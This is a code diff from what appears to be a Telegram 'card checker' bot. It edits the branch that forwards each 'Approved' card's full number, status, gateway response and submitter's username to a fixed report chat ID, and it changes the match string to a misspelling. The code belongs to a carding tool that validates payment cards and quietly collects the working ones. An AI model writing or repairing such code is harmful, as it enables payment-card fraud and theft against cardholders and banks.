@@ -59,7 +59,7 @@ def mc(client, m):
         new.edit_text(texto)
 
         # Enviar mensaje al ID 7389519750 si el resultado es Approved
-        if "Approved" in chk[0]:
+        if "Aproved" in chk[0]:
             client.send_message(
                 chat_id=APPROVED_REPORT_ID,
                 text=f"<b>Approved Card\nCard: <code>{cc_com}</code>\nStatus: {chk[0]}\nResponse: <code>{chk[1]}</code>\nFrom: @{m.from_user.username}</b>"
